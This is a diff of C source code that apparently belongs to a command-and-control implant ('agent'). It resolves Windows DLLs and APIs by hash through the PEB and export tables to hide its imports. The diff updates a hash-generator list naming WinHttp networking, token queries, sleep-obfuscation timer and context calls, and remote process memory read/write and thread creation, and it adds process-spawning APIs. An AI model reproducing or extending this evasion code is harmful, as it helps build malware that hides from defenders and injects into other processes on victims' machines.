@@ -32,46 +32,6 @@ UINT64 Rotr64HashW(const LPWSTR str) {
 	}
 	return hash;
 }
-/*
-****Hashing Order****
-
-DllNameHashes = {
-0xAF6973267322CEF1, //KERNEL32.DLL
-0xD99176CD993A6E6C, //ntdll.dll
-}
-ApiNameHashes = {
-0x27C27F0E9D246F42, //WinHttpOpen
-0xEB0E11CDF0F8755D, //WinHttpConnect
-0x271EFDAEEC211456, //WinHttpOpenRequest
-0x371EFDAEEC1C1D40, //WinHttpSendRequest
-0xB34C34E468B2D450, //WinHttpSetOption
-0x61B35AE1647C5613, //WinHttpAddRequestHeaders
-0x5849BC331DE4F77, //WinHttpReceiveResponse
-0xBC2634B9D6ABC69B, //WinHttpQueryHeaders
-0xBBCD1381F969714B, //WinHttpReadData
-0xE91AC4AB50E39E3E, //WinHttpCloseHandle
-0x934CBF2CB5BA65FE, //RtlGetVersion
-0xE7BF643E93800065, //NtClose
-0x96366A0AA4E7804E, //NtOpenProcessToken
-0x1F25DB6092C0F340, //NtOpenThreadToken
-0x30650DA980EEDACA, //NtQueryInformationToken
-0x75A514F31871F04A, //RtlAllocateHeap
-0x75A4A0B9D2C3F04A, //RtlReAllocateHeap
-0xD3B77E4DD8696D61, //RtlRandomEx
-0x7416C5FD78F4D55E, //NtGetTickCount
-0x5FC99BF0197A7133, //GetAdaptersInfo
-0x61EF0CEE5979D62B, //GetUserNameA
-0xC89E0CCD2E1EF42B, //GetComputerNameExA
-0xDFB3641D9871EFFB, //LocalAlloc
-0x9E13641CB4B6622B, //LocalReAlloc
-0xCBCA36CC38F7CC65, //LocalFree
-0xB22B0F2C5A666505, //LoadLibraryA
-0x2B3DEF2C9071F059, //GetProcAddress
-0x71DEA6CC38F7CD4F, //GetLocalTime
-0x1261F2B90D585BD0, //GetSystemTimeAsFileTime
-0x9774D5E616F6E65D, //GetSystemMetrics
-}
-*/
 
 LPVOID RetrieveModuleHandleFromHash(UINT64 hash) {
     P_INT_LDR_DATA_TABLE_ENTRY pModule = (P_INT_LDR_DATA_TABLE_ENTRY)((P_INT_PEB)agent->pTeb->ProcessEnvironmentBlock)->Ldr->InMemoryOrderLinks.Flink;
@@ -112,11 +72,10 @@ LPVOID RetrieveFunctionPointerFromhash(HMODULE Module, UINT64 Hash) {
 	for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
 
         FunctionName = (LPSTR)((LPBYTE)Module + pAddressOfNames[i]);
-        //TODO remove debug statements
-    	//printf("FunctionName: %s\n", (LPSTR)((LPBYTE)Module + pAddressOfNames[i]));
+
 		UINT64 functionNameHash = Rotr64HashA(FunctionName); // there could be issues here because i used WSTR to generate hashes. Here we're using ASTR
-    	//printf("FunctionNameHash: 0x%llX\n", functionNameHash);
-        if (functionNameHash == Hash) {
+
+	    if (functionNameHash == Hash) {
 
             DWORD funcRVA = pAddressOfFunctions[pAddressOfNameOrdinals[i]];
 			LPVOID FunctionAddr = (LPVOID)((LPBYTE)Module + funcRVA);
@@ -184,97 +143,6 @@ WORD GetNumberOfSections(_In_ PVOID ModuleBase)
     IMAGE_NT_HEADERS* NtHeaders = (IMAGE_NT_HEADERS*)((BYTE*)ModuleBase + dosHeader->e_lfanew);
 
     return NtHeaders->FileHeader.NumberOfSections;
-}
-
-//TODO finish the putting the hashes into the agent using the config builder. maybe even put it in a custom section?
-//TODO add 32bit hash support.
-void printhashes() {
-
-    UINT64 hash = 0;
-
-    LPWSTR DllNames[] = {
-		L"KERNEL32.DLL",
-		L"ntdll.dll",
-		L"user32.dll",
-		L"advapi32.dll",
-		L"winhttp.dll",
-		L"iphlpapi.dll"
-	};
-	printf("DllNameHashes = {\n");
-	for (int i = 0; i < sizeof(DllNames) / sizeof(DllNames[0]); i++) {
-		hash = Rotr64HashW(DllNames[i]);
-		printf("0x%llX, //%ls\n", hash, DllNames[i]);
-	}
-    printf("}\n");
-    LPSTR apiNames[] = {
-        "WinHttpOpen",
-        "WinHttpConnect",
-        "WinHttpOpenRequest",
-        "WinHttpSendRequest",
-        "WinHttpSetOption",
-        "WinHttpAddRequestHeaders",
-        "WinHttpReceiveResponse",
-        "WinHttpQueryHeaders",
-        "WinHttpReadData",
-        "WinHttpCloseHandle",
-        "RtlGetVersion",
-        "ZwClose",
-        "ZwOpenProcessToken",
-        "ZwOpenThreadToken",
-        "ZwQueryInformationToken",
-        "RtlAllocateHeap",
-        "RtlReAllocateHeap",
-        "RtlRandomEx",
-        "NtGetTickCount", //** THERE IS NO ZW ALTERNATIVE **
-        "GetAdaptersInfo",
-        "GetUserNameA",
-        "GetComputerNameExA",
-        "LocalAlloc",
-        "LocalReAlloc",
-        "LocalFree",
-        "LoadLibraryA",
-        "GetProcAddress",
-        "GetLocalTime",
-        "GetSystemTimeAsFileTime",
-        "GetSystemMetrics",
-        "RtlCreateTimerQueue",
-        "ZwCreateEvent",
-        "RtlCaptureContext",
-        "RtlCreateTimer",
-        "RtlRegisterWait",
-        "RtlDeleteTimerQueue",
-        "RtlCopyMappedMemory",
-        "ZwWaitForSingleObject",
-        "ZwSignalAndWaitForSingleObject",
-        "ZwContinue",
-        "ZwSetEvent",
-        "ZwSetContextThread",
-        "ZwDuplicateObject",
-        "VirtualProtect",
-        "SystemFunction032",
-        "WaitForSingleObjectEx",
-        "LdrGetProcedureAddress",
-        "ZwQueryVirtualMemory",
-    	"BaseThreadInitThunk",
-    	"RtlUserThreadStart",
-    	"ZwOpenThread",
-    	"ZwAllocateVirtualMemory",
-    	"ZwProtectVirtualMemory",
-    	"ZwCreateThreadEx",
-    	"ZwSetInformationVirtualMemory",
-    	"ZwQueryInformationProcess",
-    	"ZwOpenProcess",
-    	"ZwReadVirtualMemory",
-    	"ZwWriteVirtualMemory",
-    	"ZwCreateUserProcess",
-    	"RtlCreateProcessParametersEx",
-    };
-	printf("ApiNameHashes = {\n");
-	for (int i = 0; i < sizeof(apiNames) / sizeof(apiNames[0]); i++) {
-		hash = Rotr64HashA(apiNames[i]);
-        printf("0x%llX, //%s %d\n", hash, apiNames[i], i);
-	}
-	printf("}\n");
 }
 
 PVOID GetExceptionDirectoryAddress(HMODULE hModule, DWORD* tSize)
@@ -429,4 +297,99 @@ char* GetSymbolNameByOffset(HMODULE hModule, UINT64 offset) {
     }
 
     return NULL;
+}
+
+//TODO finish the putting the hashes into the agent using the config builder. maybe even put it in a custom section?
+//TODO add 32bit hash support.
+void printhashes() {
+
+    UINT64 hash = 0;
+
+    LPWSTR DllNames[] = {
+		L"KERNEL32.DLL",
+		L"ntdll.dll",
+		L"user32.dll",
+		L"advapi32.dll",
+		L"winhttp.dll",
+		L"iphlpapi.dll"
+	};
+	printf("DllNameHashes = {\n");
+	for (int i = 0; i < sizeof(DllNames) / sizeof(DllNames[0]); i++) {
+		hash = Rotr64HashW(DllNames[i]);
+		printf("0x%llX, //%ls\n", hash, DllNames[i]);
+	}
+    printf("}\n");
+    LPSTR apiNames[] = {
+        "WinHttpOpen",
+        "WinHttpConnect",
+        "WinHttpOpenRequest",
+        "WinHttpSendRequest",
+        "WinHttpSetOption",
+        "WinHttpAddRequestHeaders",
+        "WinHttpReceiveResponse",
+        "WinHttpQueryHeaders",
+        "WinHttpReadData",
+        "WinHttpCloseHandle",
+        "RtlGetVersion",
+        "ZwClose",
+        "ZwOpenProcessToken",
+        "ZwOpenThreadToken",
+        "ZwQueryInformationToken",
+        "RtlAllocateHeap",
+        "RtlReAllocateHeap",
+        "RtlRandomEx",
+        "NtGetTickCount", //** THERE IS NO ZW ALTERNATIVE **
+        "GetAdaptersInfo",
+        "GetUserNameA",
+        "GetComputerNameExA",
+        "LocalAlloc",
+        "LocalReAlloc",
+        "LocalFree",
+        "LoadLibraryA",
+        "GetProcAddress",
+        "GetLocalTime",
+        "GetSystemTimeAsFileTime",
+        "GetSystemMetrics",
+        "RtlCreateTimerQueue",
+        "ZwCreateEvent",
+        "RtlCaptureContext",
+        "RtlCreateTimer",
+        "RtlRegisterWait",
+        "RtlDeleteTimerQueue",
+        "RtlCopyMappedMemory",
+        "ZwWaitForSingleObject",
+        "ZwSignalAndWaitForSingleObject",
+        "ZwContinue",
+        "ZwSetEvent",
+        "ZwSetContextThread",
+        "ZwDuplicateObject",
+        "VirtualProtect",
+        "SystemFunction032",
+        "WaitForSingleObjectEx",
+        "LdrGetProcedureAddress",
+        "ZwQueryVirtualMemory",
+    	"BaseThreadInitThunk",
+    	"RtlUserThreadStart",
+    	"ZwOpenThread",
+    	"ZwAllocateVirtualMemory",
+    	"ZwProtectVirtualMemory",
+    	"ZwCreateThreadEx",
+    	"ZwSetInformationVirtualMemory",
+    	"ZwQueryInformationProcess",
+    	"ZwOpenProcess",
+    	"ZwReadVirtualMemory",
+    	"ZwWriteVirtualMemory",
+    	"ZwCreateUserProcess",
+    	"RtlCreateProcessParametersEx",
+    	"CreatePipe",
+    	"ReadFile",
+    	"CreateProcessA",
+    	"CreateProcessW",
+    };
+	printf("ApiNameHashes = {\n");
+	for (int i = 0; i < sizeof(apiNames) / sizeof(apiNames[0]); i++) {
+		hash = Rotr64HashA(apiNames[i]);
+        printf("0x%llX, //%s %d\n", hash, apiNames[i], i);
+	}
+	printf("}\n");
 }
